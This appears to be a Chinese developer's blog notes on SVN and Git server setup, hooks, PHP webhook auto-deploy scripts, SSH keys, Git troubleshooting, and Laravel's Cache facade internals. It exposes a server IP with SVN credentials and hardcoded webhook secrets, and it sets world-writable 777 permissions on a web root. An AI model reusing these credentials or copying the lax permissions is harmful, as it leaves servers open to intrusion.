/var/www/svn$ lsconf db format hooks locks README.txt$ vim conf/passwd[users]# harry = harryssecret# 账号 = 密码svn = svnpasswdsvnre = svnrepasswd$ vim conf/authz[/] //仓库下所有文件svn=rw //可读可写svnre=r //只读*= //其他用户无任何权限$ vim conf/svnserve.conf anon-access = read #匿名用户可读 auth-access = write #授权用户可写 password-db = passwd #使用哪个文件作为账号文件 authz-db = authz #使用哪个文件作为权限文件 realm = /var/www/svn/ # 认证空间名，版本库所在目录$ svnserve -d -r /var/www/svn //-d 表示守护进程， -r 表示在后台执行，默认端口为3690$ svnserve -d -r --listen-port 3691 /var/www/svn //指定3691端口启动该服务$ killall svnserve //停止全部$ ps -ef | grep svnserveroot 4148 1 0 Dec12 ? 00:00:00 svnserve -d -r /var/www/svn/a/root 8995 1 0 Dec09 ? 00:00:00 svnserve -d -r /var/www/svn/b/ --listen-port 3691root 14855 1 0 Dec19 ? 00:00:00 svnserve -d -r /var/www/svn/c/ --listen-port 3692root 27538 27343 0 09:39 pts/0 00:00:00 grep --color=auto svnserve$ kill 8995 //停止3692端口的svnserve windows中使用TortoiseSVN连接，输入地址 svn://118.24.158.116/ 即可，不出意外输入用户名svn和密码svnrepasswd就能连接成功了。默认端口3690，如果你修改了端口，那么要记得加上端口号。 Git 钩子检查 PHP 语法和代码规范1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/bin/bash## (c) Copyright codcodog## PHP 语法检查以及代码规范检查 https://github.com/codcodog/phpconfig/blob/master/git/pre-commit#如果该钩子以非零值退出，Git 将放弃此次提交，不过你可以用 git commit --no-verify 来绕过这个环节# 依赖：# - php-cs-fixer# - php-parallel-lintset -ePHP='php'CODE_STYLE_CHECK='vendor/bin/php-cs-fixer fix --dry-run --diff --diff-format=udiff -vvv'CODE_SYNTAX_CHECK='vendor/bin/parallel-lint -j 10'files=$(git diff --cached --name-only)# 若 host 没有安装 PHP# 则使用 docker 环境的 PHPis_docker_php()&#123; if ! command -v $PHP &gt; /dev/null 2&gt;&amp;1; then PHP='docker exec php php' CODE_STYLE_CHECK="$PHP $CODE_STYLE_CHECK" CODE_SYNTAX_CHECK="$PHP $CODE_SYNTAX_CHECK" fi&#125;is_php()&#123; file_extension="$&#123;1##*.&#125;" if [[ "$file_extension" == 'php' ]]; then return 0 fi return 1&#125;check_syntax()&#123; if ! $CODE_SYNTAX_CHECK "$1" &gt; /dev/null 2&gt;&amp;1; then $CODE_SYNTAX_CHECK "$1" exit 1 fi&#125;check_style()&#123; if ! $CODE_STYLE_CHECK "$1" &gt; /dev/null 2&gt;&amp;1; then $CODE_STYLE_CHECK "$1" exit 1 fi&#125;main()&#123; is_docker_php for f in $files; do if is_php "$f"; then check_syntax "$f" check_style "$f" fi done&#125;mainexit 0 带宽被打满12345apt-get install iftop根据阿里云的监控面板是网卡1（eth1）流量异常，所以通过 iftop 工具监控下 eth1 的流量：https://laravelacademy.org/post/9838.htmliftop -i eth1 -P // 带 -P 显示对应端口号iptables -I INPUT -s 114.84.146.45 -j DROP 你可能会忽略的 Git 提交规范123456789101112131415161718192021222324252627282930313233343536373839&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;type用于说明 commit 的类别，只允许使用下面7个标识。https://learnku.com/articles/25456#topnavfeat：新功能（feature）fix：修补bugdocs：文档（documentation）style： 格式（不影响代码运行的变动）refactor：重构（即不是新增功能，也不是修改bug的代码变动）test：增加测试chore：构建过程或辅助工具的变动scope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。subject是 commit 目的的简短描述，不超过50个字符。以动词开头，使用第一人称现在时，比如change，而不是changed或changes第一个字母小写结尾不加句号(.)Commit 规范的作用1、提供更多的信息，方便排查与回退;2、过滤关键字，迅速定位;3、方便生成文档;npm install -g conventional-changelog cd jartto-domo conventional-changelog -p angular -i CHANGELOG.md -w为了方便使用，可以将其写入 package.json 的 scripts 字段。&#123; "scripts": &#123; "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" &#125; &#125;这样，使用起来就很简单了：https://www.conventionalcommits.org/zh/v1.0.0-beta.3/ npm run changelognpm install --save-dev validate-commit-msg git pull或git checkout 后保持权限不变12345678910111213141516171819202122https://www.guaosi.com/2018/12/06/git-auto-change/服务器上的项目,一般都是使用用户组www-data或者www来保证权限安全,不会使用root的。但是git pull下来的新文件或者修改的文件,则会把原有的文件的权限更改为644,用户组改为rootchmod -R 755 www.guaosi.com/# 修改项目内所有文件为755权限chown -R www-data:www-data www.guaosi.com/# 修改项目内所有文件的用户和用户组为www-datacd .git/hooks/vim post-merge#!/bin/shpwdecho "This is post-merge hook"chmod -R 755 ./* &amp;&amp; chown -R www-data:www-data ./*chmod +x post-mergevim post-checkout#!/bin/shpwdecho "This is post-checkout hook"chmod -R 755 ./* &amp;&amp; chown -R www-data:www-data ./*chmod +x post-checkout Git 仓库迁移至其他服务器并实现 hooks 自动化部署123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//https://learnku.com/articles/26130一：git仓库迁移1.把需要迁移的项目克隆一份至本地电脑上。//从原地址克隆一份裸版本库，比如原本托管在旧服务器的私有仓库//–bare 创建的克隆版本库都不包含工作区，直接就是版本库的内容，这样的版本库称为裸版本库。git clone --bare ssh://git@192.10.0.1/home/git/test.git2.到新的 Git 服务器上创建一个新项目。//切换git用户,没有需要创建git用户su - git//进入git家目录cd /home/git//创建项目mkdir test.git//初始化一个裸仓库git init --bare test.git3.切换到本地电脑，以镜像推送的方式上传代码到新的服务器上。//进入第一步复制下来的test.git 项目cd test.git//以镜像推送的方式上传代码到新的服务器上。//请确保已经添加了公钥到新的机器上git push --mirror ssh://git@192.10.0.2/home/git/test.git4.删除本地电脑的test.git 项目。//rm -rf test.git5.从新的git仓库中clone项目到本地。git clone ssh://git@192.10.0.2/home/git/test.git至此，git项目完整的迁移到了新的服务器上。二 hooks自动部署到网站根目录1.把项目clone至本地根目录cd /var/www/html //进入网站上级目录git clone /home/git/test.git //test克隆test.git仓库到test网站根目录chmod -R 777 test //给网站根目录设置权限chown -R git:git test //将git用户权限设置到test根目录上2.设置钩子cd /home/git/test.git/hooks/vim post-receive//将以下内容写入到 post-receive中，并给post-receive设置可读写权限#!/bin/bashIS_BARE=$(git rev-parse --is-bare-repository)if [ -z "$IS_BARE" ]; thenecho &gt;&amp;2 "fatal: post-receive: IS_NOT_BARE"exit 1fiunset GIT_DIRDeployPath="/var/www/html/test" //你的网站根目录cd $DeployPathgit fetch --allgit reset --hard origin/master 更新与回滚1234567891011121314$ cd /var/www/deployment$ git remote set-url origin 'git@github.com:wi1dcard/hello-deployment.git'git fetch 命令获取远端状态（但不拉取到本地）：$ git fetch -t -v穿越到远端 master 分支的倒数第一次提交（即最新提交），通常用于更新至最新代码。$ git reset --hard origin/master穿越到远端 master 分支倒数第三次提交，通常用于回滚一部分错误提交。$ git reset --hard origin/master~2穿越到 ID 为 602fa83 的提交，通常用于回滚到特定版本。$ git reset --hard 602fa83 切换账号执行脚本12345678function install_composer &#123; # 「⚠️重点」下载 Composer 的 PHAR 文件https://learnku.com/articles/24919#topnav wget https://dl.laravel-china.org/composer.phar -O /usr/local/bin/composer # 「⚠️重点」给予该文件可执行权限 chmod +x /usr/local/bin/composer # 配置 Packagist 国内镜像 sudo -H -u $&#123;WWW_USER&#125; sh -c 'cd ~ &amp;&amp; composer config -g repo.packagist composer https://packagist.laravel-china.org'&#125; 生成压缩包123对mster分支代码生成压缩包供使用者下载使用，--prefix 指定目录名git archive master --prefix='hdcms/' --format=zip &gt; hdcms.zip 自动部署123456789101112131415161718192021222324252627GitHub设置 WebHook&lt;?php// GitHub Webhook Secret.// GitHub项目 Settings/Webhooks 中的 Secret$secret = "houdunren";// Path to your respostory on your server.// e.g. "/var/www/respostory"// 项目地址 https://www.houdunren.com/document/front/content/158?sid=1&amp;mid=2$path = "/www/wwwroot/xj.houdunren.com";// Headers deliveried from GitHub$signature = $_SERVER['HTTP_X_HUB_SIGNATURE'];if ($signature) &#123; $hash = "sha1=".hash_hmac('sha1', file_get_contents("php://input"), $secret); if (strcmp($signature, $hash) == 0) &#123; echo shell_exec("cd &#123;$path&#125; &amp;&amp; /usr/bin/git reset --hard origin/master &amp;&amp; /usr/bin/git clean -f &amp;&amp; /usr/bin/git pull 2&gt;&amp;1"); exit(); &#125;&#125;http_response_code(404);chown -R www .chmod -R g+s .sudo -u www git pull CONFLICT (modify/delete)123456789101112131415$ git merge wechat_loginCONFLICT (modify/delete): Wechat.php deleted in HEAD and modified in wechat_login. Version wechat_login of Wechat.php left in tree.Automatic merge failed; fix conflicts and then commit the result.$ git statusOn branch masterYou have unmerged paths. (fix conflicts and run "git commit") (use "git merge --abort" to abort the merge)Unmerged paths: (use "git add/rm &lt;file&gt;..." as appropriate to mark resolution) deleted by us: Wechat.phphttps://www.jianshu.com/p/b08316888124 Already up-to-date1234567891011121314151617181920212223242526先切换到master分支，再执行git checkout mastergit merge dev复制代码若合并分支时提示“Already up-to-date”在使用Git把当前分支合并到master提示“Already up-to-date”，但当前分支和 master 分支代码不同步。假设当前分支是：dev，主分支是：master。解决方法：git checkout master；git reset --hard dev;git push --force origin master$ git merge testAlready up to date. $ git statusOn branch masternothing to commit, working tree clean $ git diff test app/Http/Controllers/Test.phpdiff --git a/app/Http/Controllers/Test.php b/app/Http/Controllers/Test.phpindex 27c8be83..c40f563f 100644--- a/app/Http/Controllers/Test.php+++ b/app/Http/Controllers/Test.php@@ -55,7 +55,6 @@ class Test extends Controller &#123;- $return['data'] = $app ? $app['result'] : []; &#125;https://juejin.im/post/5c3d5f40f265da6169177506 文件名大小写修改12345先复制文件，再修改cp Abc.sh bbc.shsvn del Abc.shmv bbc.sh abc.shsvn add abc.sh ssh公私钥1234567891011121314151617181920212223242526272829303132333435363738394041第一步，在客户端生成公钥ssh-keygen -t rsa #生成的公钥匙在 ~/.ssh/ 目录下第二步，把公钥上传到服务器端，登录服务器追加公钥到 authorized_keys 文件简单版ssh-copy-id -i ~/.ssh/id_rsa.pub username@ip复杂版scp id_rsa.pub root@ip地址:文件保存路径ssh root@ip #登录服务器cd id_rsa.pub 文件保存路径cat id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys 追加到文件中如果 .shh 目录或 authorized_keys 文件不存在需要自己新建第三步，修改服务器端 ssh 配置文件 /etc/ssh/sshd_configRSAAuthentication yes #开启RSA验证PubkeyAuthentication yes #是否使用公钥验证PasswordAuthentication no #禁止使用密码验证登录chmod 700 /root/.ssh/ #为了安全把文件修改权限，可选，部分系统新建即为 700chmod 600 /root/.ssh/authorized_keys #为了安全把文件修改权限，可选，部分系统新建即为 600第四步，服务器端重启 ssh 服务service sshd restart #重启 sshd 服务在 .ssh 目录下新建 config 文件，内容如下Host test1 #自定义名称HostName ip #服务器 ip 地址User nick #用户名Port 22 # ssh 端口号，默认 22 可以不设置Host test2 #自定义名称HostName ip #服务器 ip 地址User nick #用户名Port 22228 # ssh 端口，自定义端口，修改为指定端口号连接方式ssh test1 #如果配置了公私钥就直接登录，没有的话输入密码登录 https://linux.hellocode.name/used-settings.html Connection reset12345678910111213141516171819202122232425262728293031323334353637ssh: connect to host github.com port 22: Connection timed outfatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.说明git软件无法通过ssh连接到github,有可能时防火墙或ISP设置的防火墙阻止端口22上的ssh连接，可以用以下命令替换:git remote add origin-https xxx(https方式)git push -u origin-https mastergit pull origin-https master$ git config --local -lcore.repositoryformatversion=0core.filemode=falsecore.bare=falsecore.logallrefupdates=truecore.symlinks=falsecore.ignorecase=trueremote.github.url=git@sushengbuhuo.github.com:sushengbuhuo/sushengbuhuo.github.io.gitremote.github.fetch=+refs/heads/backup:refs/remotes/github/backupbranch.master.remote=githubbranch.master.merge=refs/heads/backup运行git config --local -e打开配置信息。修改其中的url = git@github.com:username/repo.git为url = https://username@github.com/username/repo.git这样就改为使用https协议了。提交什么的就OK了。 Could not read from remote repository123456789101112131415161718192021222324252627282930313233343536373839404142$ git clone git@xxx.com/app/api.gitCloning into 'api'...@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: POSSIBLE DNS SPOOFING DETECTED! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@The ECDSA host key for git.staff.sina.com.cn has changed,and the key for the corresponding IP address is unknown. This could either mean thatDNS SPOOFING is happening or the IP address for the hostand its host key have changed at the same time.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!Someone could be eavesdropping on you right now (man-in-the-middle attack)!It is also possible that a host key has just been changed.The fingerprint for the ECDSA key sent by the remote host isSHA256:q5enZT9xuv1ySs09+ .Please contact your system administrator.Add correct host key in /c/Users/xxx/.ssh/known_hosts to get rid of this message.Offending ECDSA key in /c/Users/xxx/.ssh/known_hosts:8ECDSA host key for git.xxx.com has changed and you have requested strict checking.Host key verification failed.fatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists.删除/c/Users/xxx/.ssh/known_hosts 第8行重新clone git clone git@xxx.com/app/api.gitCloning into 'api'...The authenticity of host 'git.xxx.com ' can't be established.ECDSA key fingerprint is SHA256:q5enZT9xuv1ySs09+ .Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'git.xxx.com, ' (ECDSA) to the list of known hosts.remote: Enumerating objects: 63303, done.remote: Counting objects: 100% (63303/63303), done.remote: Compressing objects: 100% (19487/19487), done.remote: Total 63303 (delta 42781), reused 62710 (delta 42523)Receiving objects: 100% (63303/63303), 23.86 MiB | 14.71 MiB/s, done.Resolving deltas: 100% (42781/42781), done.Checking out files: 100% (9761/9761), done. Git 优雅的撤销中间某次提交12345678910111213141516171819git revert 100047dcc -m 1参数 -m 就是指定要撤销的那个提价，从左往右，从 1 开始数；也就是我撤销的是 0099aca7。接着其把代码冲突，然后我就解决冲突，保留主分支的代码，去掉那个人的代码。git push1，首先git log查看提交记录，找到出错的前一笔提交的commit_id2，用命令git rebase -i commit_id ,查找提交记录3，将出错那笔提交的pick改为drop4，Esc，:wq1、git reset --hard 1d7444 #回退到出错版本前一个commit2、git cherry-pick 626335 #将某次commit的更改应用到当前版本(将出错 cmmit 之后别人提交的代码合并到当前正常代码分支上)3、git push origin HEAD --force #强制提交https://learnku.com/articles/31705 git原理1234567891011121314151617181920212223242526272829303132333435363738394041424344454647创建 blob 对象：$ echo 'test content' | git hash-object -w --stdin-w 表示存储对象。d670460b4b4aece5915caf5c68d12f560a9fe3e返回一个长度为 40 字符的校验和，为对象名。校验和是一个 SHA-1 哈希值，由对象数据和一个 header 一起做 SHA-1 校验运算而成。读取 blod 对象$ git cat-file -p d670460b4b4aece5915caf5c68d12f560a9fe3etest content-p Pretty-print the contents of object based on its type.-t 输出对象类型blobHEAD 引用用途：记录当前分支所在的分支引用存储当前分支的引用的引用，是一个符号引用，不像普通引用包含一个 SHA-1 值。$ cat .git/HEADref: refs/heads/test cat .git/refs/heads/master4b8c160d38e4befa3bc515f12208583dd4e8814f$ cat .git/refs/remotes/origin/master4b8c160d38e4befa3bc515f12208583dd4e8814fgit cat-file -p 4b8c160d38e4befa3bc515f12208583dd4e8814ftree 40db0fc4e10857c0a774365c799ffd7e2fe4c052parent cb65f329f7928a39e801af5151539246a70dfea6parent ae4107d8e7eb6dec926f2488c70dab23a06bc9d8author 666 1565317494 +0800committer 66 1565317494 +0800Merge branch 'feature/test'https://learnku.com/articles/32272 Git 获取指定文件12345678910111213141516https://me.jinchuang.org/archives/145.html具体实现如下：$mkdir project_folder$cd project_folder$git init$git remote add -f origin &lt;url&gt;上面的代码会帮助你创建一个空的本地仓库，同时将远程Git Server URL加入到Git Config文件中。接下来，我们在Config中允许使用Sparse Checkout模式：$git config core.sparsecheckout true 接下来你需要告诉Git哪些文件或者文件夹是你真正想Check Out的，你可以将它们作为一个列表保存在.git/info/sparse-checkout文件中。例如：$echo “libs” &gt;&gt; .git/info/sparse-checkout $echo “apps/register.go” &gt;&gt; .git/info/sparse-checkout $echo “resource/css” &gt;&gt; .git/info/sparse-checkout 最后，你只要以正常方式从你想要的分支中将你的项目拉下来就可以了：$git pull origin master Git 实现 Laravel 项目的自动化部署1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# 创建一个名叫jouzeyu的用户adduser jouzeyu#在根目录下的 home 文件夹下创建一个git文件夹mkdir /home/git #切换到创建好的git文件夹cd /home/git#创建 .ssh文件夹，里面主要用来放公钥mkdir .ssh#切换到.ssh文件夹并创建authorized_keys文件cd .sshtouch authorized_keys使用 cat ~/.ssh/id_rsa.pub 命令可以获取公钥，复制它，使用 vi 或者 vim 命令把它粘贴到我们之前创建的 authorized_keys 文件中，使用:wq 保存mkdir /www/wwwroot/gitcd /www/wwwroot/git初始化仓库：#初始化一个裸仓库（强烈建议）git init --bare website.git#配置仓库的权限，让我们之前创建好的git用户jouzeyu能读写chown -R git:git website.git#创建我服务器上的项目目录testmkdir /www/wwwroot/test#克隆仓库git clone /www/wwwroot/git/website.git#设置权限chown -R git website# 通过ip地址从配置好的线上仓库拉取下来git clone git@47.97.121.XXX:/www/wwwroot/git/website.git# 如果有配置域名的话也可以通过域名拉取git clone git@www.XXX.XXX:/www/wwwroot/git/website.git# 打开刚才克隆下来的本地仓库cd website# 创建README.md文件touch README.mdgit add .git commit -m"创建README.md文件"git push#切换到这个目录cd /www/wwwroot/git/website.git/hooks# 生成post-receive文件touch post-receive# 使用vim编辑vim post-receive#!/bin/sh# 打印输出echo '======上传代码到服务器======'# 打开线上项目文件夹cd /www/wwwroot/test/website# 这个很重要，如果不取消的话将不能在cd的路径上进行git操作unset GIT_DIRgit pull origin master# 自动编译vue项目,如有需要请去掉前面的#号# npm run build# 自动更新composer（我暂时没试过）# composer updateecho $(date) &gt;&gt; hook.logecho '======代码更新完成======'chmod +x post-receivehttps://learnku.com/articles/33689 gitee 和 GitHub 的 webhook 的使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//访问秘钥$keySecret = '^!@KVzPZ^DaRNA7R53353%7aEAfsfdOptH7b%0i5';//需要更新的项目目录$wwwRoot = [ '/www/wwwroot/test1', '/www/wwwroot/test2',];//保存运行脚本的日志$logFile = 'log/layuimini-githook.log';//git执行命令$gitCommand = 'git pull';// 判断是否开启秘钥认证(已实现gitee和github)if (isset($keySecret) &amp;&amp; !empty($keySecret)) &#123; list($headers, $gitType) = [[], null]; foreach ($_SERVER as $key =&gt; $value) &#123; 'HTTP_' == substr($key, 0, 5) &amp;&amp; $headers[str_replace('_', '-', substr($key, 5))] = $value; if (empty($gitType) &amp;&amp; strpos($key, 'GITEE') !== false) &#123; $gitType = 'GITEE'; &#125; if (empty($gitType) &amp;&amp; strpos($key, 'GITHUB') !== false) &#123; $gitType = 'GITHUB'; &#125; &#125; if ($gitType == 'GITEE') &#123; if (!isset($headers['X-GITEE-TOKEN']) || $headers['X-GITEE-TOKEN'] != $keySecret) &#123; die('GITEE - 请求失败，秘钥有误'); &#125; &#125; elseif ($gitType == 'GITHUB') &#123; $json_content = file_get_contents('php://input'); $signature = "sha1=" . hash_hmac('sha1', $json_content, $keySecret); if ($signature != $headers['X-HUB-SIGNATURE']) &#123; die('GITHUB - 请求失败，秘钥有误'); &#125; &#125; else &#123; die('请求错误，未知git类型'); &#125;&#125;!is_array($wwwRoot) &amp;&amp; $wwwRoot = [$wwwRoot];foreach ($wwwRoot as $vo) &#123; $shell = sprintf("cd %s &amp;&amp; git pull 2&gt;&amp;1", $vo); $output = shell_exec($shell); $log = sprintf("[%s] %s \n", date('Y-m-d H:i:s', time()) . ' - ' . $vo, $output); echo $log; file_put_contents($logFile, $log, FILE_APPEND);&#125;修改项目目录权限 chown -R www:www 项目路径 Forestry 管理基于 GitHub 的图床123456789101112131415161718192021免费提供静态博客管理功能，使你的博客拥有 CMS 般的体验。你可以很轻松地编写、修改和发布博客，包括图片与文件，而不需要手动去编译上传，Forestry 已经为你自动处理了github登录https://forestry.io/授权对应的GitHub库修改时区Settings &gt;&gt; General &gt;&gt; TIMEZONE，选择 (GMT+08:00) Beijing，保存 Save settings修改上传规则Settings &gt;&gt; Media &gt;&gt; UPLOAD DIRECTORY 改为空Settings &gt;&gt; Media &gt;&gt; PUBLIC PATH 改为空Settings &gt;&gt; Media &gt;&gt; FILE PATH 改为 :year::month::day:/:filename:本地上传文件 在GitHub可以看到 图片地址 https://cdn.jsdelivr.net/gh/sushengbuhuo/pics@master/20191022/钟楚红.jpghttps://gleehub.com/other/shi-yong-forestry-guan-li-ji-yu-github-de-tu-chuang.html使用jsDelivr加速Github仓库的图片作为博客的图床 https://tingtas.com/posts/4341d485/#前言 删除git历史12345678git checkout --orphan newgit add -Agit commit -m "init" git branch -D mastergit branch -m new mastergit push --set-upstream origin master -fhttps://juejin.im/post/5be995c25188250fa8358f9d Linux 环境下 Git 服务器的搭建 Git 命令行辅助脚本工具 GitHub Pages 指南极客学院 git简化笔记 Git笔记(三)——[cherry-pick, merge, rebase] 跟我一起学Git(十二) 合并项目 GIT使用rebase和merge的正确姿势 Github 的 WebHooks 实现代码自动更新 GitHub搜索 随机删文件 Github 项目活跃度分析工具 浏览 GitHub 问题和提取请求的方法 github 图解教程 在Windows安装Gogs svn安装和使用总结 随机生成 Git commit git commit -m $(curl -s http://whatthecommit.com/index.txt) CentOS 7 | Firewall防火墙使用总结 基于Gitea打造一个属于你自己的代码托管平台 基于 Gitea+Drone CI+Vault 打造属于自己的CI/CD工作流 Git 练习场–直观形象又好玩 linux从入门到实践 nginx从入门到实践 在 Linux 下搭建 Git 服务器 学习git 学好英语，走向国际 Mac/Linux 安装中文版 man 帮助命令 PHP、Git、Shell等笔记 netstat 命令查看连接数判断攻击 在Github上建立自己的Wiki Git的各种Undo技巧 PHPer 要掌握的常用 linux 命令 GitLab 安装、管理、运维 个人网站生成器工具 切换git分支 Git 实现 Laravel 项目的自动化部署 Linux bash总结 GitHubDaily 分享内容定期整理与分类 数据结构与算法/leetcode/lintcode题解 来自不同开发人员为大学生收集整理的一系列资源 整合了编程竞赛有趣又实用的知识站点 ssh example 《后端架构师技术图谱》 Git 的奇技淫巧 Linux 笔记分享二十（终章）：网络命令 搭建Git服务器 入门 Linux 之 从命令行开始 Linux下恢复误删除的文件 Linux 下工作必须会的命令清单 中日合拍的《Git游记》即将正式开机 查看 Git 文件变动历史 Git的奇技淫巧 使用GitBook+Github编写文档书籍 猴子都能懂得git Git commit emoji git 学习笔记]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[laravel cache facade]]></title>
    <url>%2F2019%2F01%2F08%2Flaravel-cache-facade%2F</url>
    <content type="text"><![CDATA[本文使用版本为laravel5.5 cache get12345678public function cache() &#123; $c=\Cache::get('app'); if(!$c) &#123; \Cache::put('app', 'cache', 1); &#125; dump($c);//cache &#125; config/app.php1234567891011'aliases' =&gt; [ 'App' =&gt; Illuminate\Support\Facades\App::class, 'Artisan' =&gt; Illuminate\Support\Facades\Artisan::class, 'Auth' =&gt; Illuminate\Support\Facades\Auth::class, 'Blade' =&gt; Illuminate\Support\Facades\Blade::class, 'Broadcast' =&gt; Illuminate\Support\Facades\Broadcast::class, 'Bus' =&gt; Illuminate\Support\Facades\Bus::class, 'Cache' =&gt; Illuminate\Support\Facades\Cache::class, ] 使用cache实际调用的是Illuminate\Support\Facades\Cache,这个映射是如何做的？ public/index.php123$response = $kernel-&gt;handle($request = Illuminate\Http\Request::capture()); bootstarp/app.php1234$app-&gt;singleton( Illuminate\Contracts\Http\Kernel::class, App\Http\Kernel::class); app/http/kernel.php123456use Illuminate\Foundation\Http\Kernel as HttpKernel;class Kernel extends HttpKernel&#123;&#125; Illuminate/Foundation/Http/Kernel.php12345678910111213141516171819202122232425262728293031323334353637383940public function handle($request)&#123; try &#123; $request-&gt;enableHttpMethodParameterOverride(); $response = $this-&gt;sendRequestThroughRouter($request); &#125; catch (Exception $e) &#123; $this-&gt;reportException($e); $response = $this-&gt;renderException($request, $e); &#125; catch (Throwable $e) &#123; $this-&gt;reportException($e = new FatalThrowableError($e)); $response = $this-&gt;renderException($request, $e); &#125; $this-&gt;app['events']-&gt;dispatch( new Events\RequestHandled($request, $response) ); return $response;&#125;protected function sendRequestThroughRouter($request) &#123; $this-&gt;app-&gt;instance('request', $request); Facade::clearResolvedInstance('request'); $this-&gt;bootstrap(); return (new Pipeline($this-&gt;app)) -&gt;send($request) -&gt;through($this-&gt;app-&gt;shouldSkipMiddleware() ? [] : $this-&gt;middleware) -&gt;then($this-&gt;dispatchToRouter()); &#125; public function bootstrap() &#123; if (! $this-&gt;app-&gt;hasBeenBootstrapped()) &#123; $this-&gt;app-&gt;bootstrapWith($this-&gt;bootstrappers()); &#125; &#125; Illuminate/Foundation/Application.php123456789101112public function bootstrapWith(array $bootstrappers) &#123; $this-&gt;hasBeenBootstrapped = true; foreach ($bootstrappers as $bootstrapper) &#123; $this['events']-&gt;fire('bootstrapping: '.$bootstrapper, [$this]); $this-&gt;make($bootstrapper)-&gt;bootstrap($this); $this['events']-&gt;fire('bootstrapped: '.$bootstrapper, [$this]); &#125; &#125; Illuminate/Foundation/Bootstrap/RegisterFacades.php1234567891011public function bootstrap(Application $app) &#123; Facade::clearResolvedInstances(); Facade::setFacadeApplication($app);//将config/app.php 里的aliases数组里面的Facades类设置别名 AliasLoader::getInstance(array_merge( $app-&gt;make('config')-&gt;get('app.aliases', []), $app-&gt;make(PackageManifest::class)-&gt;aliases() ))-&gt;register(); &#125; Illuminate/Foundation/AliasLoader.php123456789101112131415public function load($alias) &#123; if (static::$facadeNamespace &amp;&amp; strpos($alias, static::$facadeNamespace) === 0) &#123; $this-&gt;loadFacade($alias); return true; &#125; // $alias来自于config/app.php中aliases数组 if (isset($this-&gt;aliases[$alias])) &#123; //'Route' =&gt; Illuminate\Support\Facades\Route::class, // class_alias 为一个类创建别名 return class_alias($this-&gt;aliases[$alias], $alias); &#125; &#125; Illuminate/Support/Facades/Cache.php123456789101112class Cache extends Facade&#123; /** * Get the registered name of the component. * * @return string */ protected static function getFacadeAccessor() &#123; return 'cache'; &#125;&#125; Illuminate/Support/Facades/Facade.php这个文件没有get set ，只有__callStatic123456789101112131415161718192021222324252627public static function __callStatic($method, $args) &#123; $instance = static::getFacadeRoot(); if (! $instance) &#123; throw new RuntimeException('A facade root has not been set.'); &#125; return $instance-&gt;$method(...$args); &#125; public static function getFacadeRoot() &#123; return static::resolveFacadeInstance(static::getFacadeAccessor()); &#125; protected static function resolveFacadeInstance($name) &#123; //这里$name为cache if (is_object($name)) &#123; return $name; &#125; if (isset(static::$resolvedInstance[$name])) &#123; return static::$resolvedInstance[$name]; &#125; //$app是容器对象，实现了ArrayAccess接口，最终调用的还是容器的make方法 return static::$resolvedInstance[$name] = static::$app[$name]; &#125; Illuminate\Container\Container.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public function make($abstract, array $parameters = []) &#123; return $this-&gt;resolve($abstract, $parameters); &#125; protected function resolve($abstract, $parameters = []) &#123; $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null( $this-&gt;getContextualConcrete($abstract) ); // If an instance of the type is currently being managed as a singleton we'll // just return an existing instance instead of instantiating new instances // so the developer can keep using the same objects instance every time. if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123; return $this-&gt;instances[$abstract]; &#125; $this-&gt;with[] = $parameters; $concrete = $this-&gt;getConcrete($abstract); // We're ready to instantiate an instance of the concrete type registered for // the binding. This will instantiate the types, as well as resolve any of // its "nested" dependencies recursively until all have gotten resolved. if ($this-&gt;isBuildable($concrete, $abstract)) &#123; $object = $this-&gt;build($concrete); &#125; else &#123; $object = $this-&gt;make($concrete); &#125; // If we defined any extenders for this type, we'll need to spin through them // and apply them to the object being built. This allows for the extension // of services, such as changing configuration or decorating the object. foreach ($this-&gt;getExtenders($abstract) as $extender) &#123; $object = $extender($object, $this); &#125; // If the requested type is registered as a singleton we'll want to cache off // the instances in "memory" so we can return it later without creating an // entirely new instance of an object on each subsequent request for it. if ($this-&gt;isShared($abstract) &amp;&amp; ! $needsContextualBuild) &#123; $this-&gt;instances[$abstract] = $object; &#125; $this-&gt;fireResolvingCallbacks($abstract, $object); // Before returning, we will also set the resolved flag to "true" and pop off // the parameter overrides for this build. After those two things are done // we will be ready to return back the fully constructed class instance. $this-&gt;resolved[$abstract] = true; array_pop($this-&gt;with); return $object; &#125; Illuminate/Cache/CacheServiceProvider.php1234567891011121314public function register() &#123; $this-&gt;app-&gt;singleton('cache', function ($app) &#123; return new CacheManager($app); &#125;); $this-&gt;app-&gt;singleton('cache.store', function ($app) &#123; return $app['cache']-&gt;driver(); &#125;); $this-&gt;app-&gt;singleton('memcached.connector', function () &#123; return new MemcachedConnector; &#125;); &#125; get set12345$instance-&gt;$method(...$args)由于 PHP 可以处理 WEB 和 CLI 两种接口请求，所以 Laravel 就得需要设计 HttpKernel 和 ConsoleKernel 来处理这两种。实际上，Laravel 刚刚启动时先启动容器对象 Application，然后加载配置、通过 ServiceProvider 往容器对象里填充一些对象为接下来处理请求做准备，但是真正干活的是 Kernel(HttpKernel 或 ConsoleKernel)，Application 会把活转给 Kernel 来干。$output = Kernel::handle($input)：对于 